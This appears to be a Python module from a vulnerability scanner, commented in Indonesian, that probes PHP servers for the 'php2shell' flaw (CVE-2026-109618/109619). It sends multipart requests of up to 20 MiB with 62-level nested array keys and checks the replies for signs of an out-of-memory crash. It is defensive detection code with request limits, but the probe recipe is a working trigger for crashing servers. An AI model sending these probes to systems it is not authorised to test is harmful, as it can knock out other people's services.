"""lib/oomprobe.py — deteksi aktif php2shell (CVE-2026-109618/109619).

Metode mengikuti pendekatan publik assetnote/php2shell-scanner dan
Searchlight Cyber (link di README §Kredit):
  1. control request : multipart kecil sah (baseline; HARUS menghasilkan
     body non-kosong) — dipakai sebagai pembanding.
  2. 3 probe OOM     : multipart dengan array-key nested 62 level,
     ukuran naik 1 MiB → 8 MiB → 20 MiB. Struktur nested-key inilah yang
     memicu jalur upload-progress/php_default_treat_data yang divulnerable
     oleh CVE-2026-109618/109619.

Sinyal VULNERABLE (apapun yang pertama cocok):
  S1 : body probe memuat fatal "Allowed memory size of ... bytes
       exhausted" DAN file/lokasi "Unknown" — OOM terjadi DI DALAM
       parser multipart (bukan di kode aplikasi).
  S2 : differential-empty-500 — control menghasilkan body, probe
       menjawab HTTP 500 dengan body kosong (worker FPM mati di tengah).
  S3 : worker abort — probe menjawab 502/503/504 padahal control sehat.
  S4 : empty-200 — probe menjawab HTTP 200 body kosong padahal control
       ber-body (varian FPM worker mati; front tetap menjawab).

Gating SAPI (mengikuti scanner resmi assetnote):
  S3/S4 hanya sah untuk sapi "fpm"/"auto"; di "mod_php" kematian worker
  membawa Apache turun dan tidak menghasilkan response front-server.

Fitur lain yang mengikuti scanner resmi:
  - control body ber-marker "phpMyAdmin" → seluruh pengujian dialihkan
    ke /show_config_errors.php (path config-error phpMyAdmin).

Bukan sinyal:
  - 4xx reject WAF (400/403/413/429/431/dst.) → "blocked", bukan verdict.
  - 500 dengan body NON-kosong (error aplikasi biasa) → inconclusive.
  - control sendiri sudah 5xx → target bermasalah, probe dibatalkan
    (INCONCLUSIVE) supaya tidak menuduh salah sasaran.

Batas etis (mengikuti memprobe.py):
  - maksimal 4 request per target (1 control + 3 probe), TANPA retry —
    transport dipakai dengan retries=0 agar OOM tidak mengirim ulang
    payload belasan MB.
  - tidak ada eskalasi otomatis di atas 20 MiB.
  - hasil selalu melampirkan bukti (status/panjang body/utiran fatal).

Pemakaian:
    from .oomprobe import oom_detect
    res = oom_detect("http://target/index.php")
    res["verdict"]     : vulnerable | not_vulnerable | blocked |
                         inconclusive | error
    res["signal"]      : oom_in_parser | empty_500 | worker_abort | ...
    res["evidence"]    : string pendek untuk laporan
"""

from __future__ import annotations

from dataclasses import dataclass, field

from .transport import Transport

# ---- konstanta metode (mengikuti scanner publik assetnote) ----
NESTED_KEYS = 62                    # kedalaman kunci array nested
PROBES_MB = (1, 8, 20)              # ukuran probe bertingkat (MiB)
CHUNK = 64 * 1024                   # ukuran potongan untuk membangun body
MAX_CONTROL_5XX = 499               # control >= 500 → target bermasalah

REJECT_STATUSES = {400, 403, 411, 413, 414, 417, 422, 429, 431}

_FATAL_MARKERS = (
    b"Allowed memory size of",
    b"bytes exhausted",
)
_FATAL_LOC_UNKNOWN = b"Unknown"

# false-positive guard: PHP menolak POST yang melebihi post_max_size SEBELUM
# parser multipart jalan; warning-nya juga berlokasi "Unknown" sehingga
# tanpa saringan ini bisa salah dipercaya sebagai S1.
_POSTLEN_MARKER = b"POST Content-Length of"

# phpMyAdmin: control body yang memuat marker ini dipindah ke path khusus
# (config file bisa terekspos di sana; mengikuti perilaku scanner assetnote).
PHPMYADMIN_MARKER = b"phpMyAdmin"
PHPMYADMIN_PATH = "/show_config_errors.php"

# Sinyal worker-abort hanya bermakna di belakang front-server (FPM): mod_php
# yang mati membawa proses Apache turun dan tidak memproduksi 502/503/504
# maupun 200-kosong dari handler lain. Mengikuti gating SAPI scanner resmi.
FPM_ABORT_STATUSES = (502, 503, 504)


@dataclass
class OOMResult:
    verdict: str = "inconclusive"   # vulnerable|not_vulnerable|blocked|inconclusive|error
    signal: str = ""                # oom_in_parser|empty_500|worker_abort|control_unhealthy|rejected|none
    evidence: str = ""
    probes_sent: int = 0
    probe_results: list[dict] = field(default_factory=list)
    error: str = ""

    def as_dict(self) -> dict:
        return {
            "verdict": self.verdict,
            "signal": self.signal,
            "evidence": self.evidence,
            "probes_sent": self.probes_sent,
            "probe_results": self.probe_results,
            "error": self.error,
        }


def _nested_name(level: int = NESTED_KEYS) -> str:
    """Nama field multipart dengan kunci array nested: a[b][c]... 62 level."""
    return "a" + "[b]" * (level - 1)


def _multipart_body(field_name: str, payload: bytes, boundary: str = "x") -> bytes:
    """Bangun body multipart sederhana berisi satu field (dengan nested key)."""
    head = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"\r\n\r\n'
    ).encode()
    return head + payload + f"\r\n--{boundary}--\r\n".encode()


def _build_payload(size_mb: int) -> bytes:
    """Payload 'A' * n dibangun per-chunk agar hemat memori proses scanner."""
    total = size_mb * 1024 * 1024
    block = b"A" * CHUNK
    parts = []
    left = total
    while left > 0:
        take = min(CHUNK, left)
        parts.append(block[:take])
        left -= take
    return b"".join(parts)


def _classify_response(resp, control_body_len: int, sapi: str = "auto") -> tuple[str, str]:
    """Petakan satu response probe ke (verdict, signal) menurut sinyal S1-S4.

    sapi: "auto" (aturan gabungan mod_php+FPM, default) | "mod_php" | "fpm".
    Sinyal abort (502/503/504, 200-kosong) hanya sah untuk FPM/auto — di
    mod_php kematian worker membawa Apache ikut turun, tidak menghasilkan
    response front-server. Sama seperti gating scanner resmi assetnote.
    """
    body_b = (resp.body or "").encode("utf-8", "replace")
    body_len = len(body_b)
    status = resp.status

    # S1: fatal OOM DI DALAM parser (lokasi "Unknown") — TAPI bukan
    # warning "POST Content-Length exceeds" yang juga berlokasi Unknown
    # dan muncul hanya karena POST > post_max_size (bukan bug kita).
    if _POSTLEN_MARKER in body_b:
        return "inconclusive", "post_len_rejected"

    has_oom = all(m in body_b for m in _FATAL_MARKERS)
    if has_oom and _FATAL_LOC_UNKNOWN in body_b:
        return "vulnerable", "oom_in_parser"

    # S2: differential empty-500 — control ber-body, probe 500 tanpa body
    if status == 500 and control_body_len > 0 and body_len == 0:
        return "vulnerable", "empty_500"

    # WAF/reject → bukan verdict, tandai blocked
    if status in REJECT_STATUSES:
        return "blocked", "rejected"

    # 500 dengan body non-kosong = error aplikasi, bukan sinyal
    if status == 500 and body_len > 0:
        return "inconclusive", "nonempty_500"

    # S3/S4: sinyal abort hanya untuk FPM/auto (worker mati di belakang front)
    if sapi != "mod_php":
        # S3: 502/503/504 = worker mati di belakang front-server
        if status in FPM_ABORT_STATUSES:
            return "vulnerable", "worker_abort"
        # S4: 200 dengan body kosong padahal control ber-body =
        # worker FPM mati di tengah request, front tetap menjawab 200
        if status == 200 and control_body_len > 0 and body_len == 0:
            return "vulnerable", "empty_200"

    return "inconclusive", "no_signal"


def oom_detect(
    url: str,
    transport: Transport | None = None,
    proxy: str | None = None,
    profile: str = "chrome",
    timeout: int = 30,
    sapi: str = "auto",
) -> OOMResult:
    """Deteksi aktif php2shell: control + 3 probe OOM nested-62.

    sapi: "auto" (gabungan aturan mod_php+FPM, default) | "mod_php" | "fpm".

    Transport dibuat internal dengan retries=0 (payload besar tidak boleh
    dikirim ulang otomatis). Bila `transport` diberikan dari luar, retries
    dipaksa 0 untuk probe ini demi keamanan target.
    """
    own = transport is None
    if own:
        t = Transport(profile=profile, timeout=timeout, retries=0, proxy=proxy)
    else:
        t = transport
        # keamanan: jangan pernah retry payload besar
        t.retries = 0

    res = OOMResult()
    try:
        # ---- 1. control: multipart kecil yang sah ----
        control_name = _nested_name()
        c_body = _multipart_body(control_name, b"hello", boundary="x")
        control = t.post(
            url,
            data=c_body,
            headers={
                "Content-Type": 'multipart/form-data; boundary="x"',
                "Content-Length": str(len(c_body)),
            },
        )
        if control.error:
            res.verdict = "error"
            res.error = f"control: {control.error}"
            return res
        if control.status >= 500:
            # kontrol pun sudah 5xx → target bermasalah; jangan tuduh CVE
            res.verdict = "inconclusive"
            res.signal = "control_unhealthy"
            res.evidence = f"control HTTP {control.status} sebelum probe apa pun"
            return res

        ctrl_body_len = len((control.body or "").encode("utf-8", "replace"))
        ctrl_body_bytes = (control.body or "").encode("utf-8", "replace")

        # ---- 1b. phpMyAdmin: alihkan ke /show_config_errors.php ----
        target_url = url
        if PHPMYADMIN_MARKER in ctrl_body_bytes:
            from urllib.parse import urlsplit, urlunsplit

            parts = urlsplit(url)
            target_url = urlunsplit((parts.scheme, parts.netloc, PHPMYADMIN_PATH, "", ""))
            control = t.post(
                target_url,
                data=c_body,
                headers={
                    "Content-Type": 'multipart/form-data; boundary="x"',
                    "Content-Length": str(len(c_body)),
                },
            )
            if control.error:
                res.verdict = "error"
                res.error = f"control phpMyAdmin: {control.error}"
                return res
            if control.status >= 500:
                res.verdict = "inconclusive"
                res.signal = "control_unhealthy"
                res.evidence = f"control phpMyAdmin HTTP {control.status} sebelum probe"
                return res
            ctrl_body_len = len((control.body or "").encode("utf-8", "replace"))

        # ---- 2. tiga probe OOM bertingkat ----
        for mb in PROBES_MB:
            payload = _build_payload(mb)
            body = _multipart_body(_nested_name(), payload, boundary="x")
            r = t.post(
                target_url,
                data=body,
                headers={
                    "Content-Type": 'multipart/form-data; boundary="x"',
                    "Content-Length": str(len(body)),
                },
            )
            res.probes_sent += 1
            if r.error:
                # koneksi putus saat upload besar juga bisa jadi tanda
                # worker mati di tengah jalan — tapi tidak bisa dibedakan
                # dari masalah jaringan; tandai inconclusive dengan bukti.
                res.probe_results.append({
                    "probe_mb": mb, "status": 0, "verdict": "error",
                    "signal": "transport_error", "evidence": r.error,
                })
                if res.verdict != "vulnerable":
                    res.verdict = "inconclusive"
                    res.signal = "transport_error"
                    res.evidence = f"probe {mb}MiB: {r.error}"
                continue

            verdict, signal = _classify_response(r, ctrl_body_len, sapi=sapi)
            evid = (
                f"probe {mb}MiB → HTTP {r.status}, body {len(r.body or '')} B"
            )
            res.probe_results.append({
                "probe_mb": mb, "status": r.status,
                "verdict": verdict, "signal": signal, "evidence": evid,
            })

            if verdict == "vulnerable":
                res.verdict = "vulnerable"
                res.signal = signal
                res.evidence = evid + (
                    f" | fatal-in-parser" if signal == "oom_in_parser" else ""
                )
                return res  # satu sinyal cukup; berhenti lebih awal
            if verdict == "blocked":
                res.verdict = "blocked"
                res.signal = "rejected"
                res.evidence = evid + " (WAF/reject; naikkan tidak membantu)"
                return res
            # simpan sinyal terakhir untuk konteks
            res.signal = signal
            res.evidence = evid

        # tidak ada sinyal vulnerable di ketiga probe.
        # PENTING: "tidak ada OOM" bisa berarti memory_limit > 20MiB
        # (probe tidak cukup besar), bukan pasti tidak rentan — jangan
        # pernah mengklaim "not_vulnerable" dari ketidakhadiran fatal;
        # itulah false-positive terbalik yang juga dikritisi publik.
        if res.verdict != "blocked":
            res.verdict = "inconclusive"
            res.evidence = (
                "control sehat, tidak ada fatal-in-parser/empty-500/abort "
                "pada probe 1/8/20 MiB — memory_limit target kemungkinan "
                "> 20 MiB sehingga OOM tidak tercapai (naikkan probe atau "
                "verifikasi via versi/patch-level)"
            )
        return res
    except Exception as exc:  # noqa: BLE001
        res.verdict = "error"
        res.error = f"{type(exc).__name__}: {exc}"
        return res
    finally:
        if own:
            t.close()
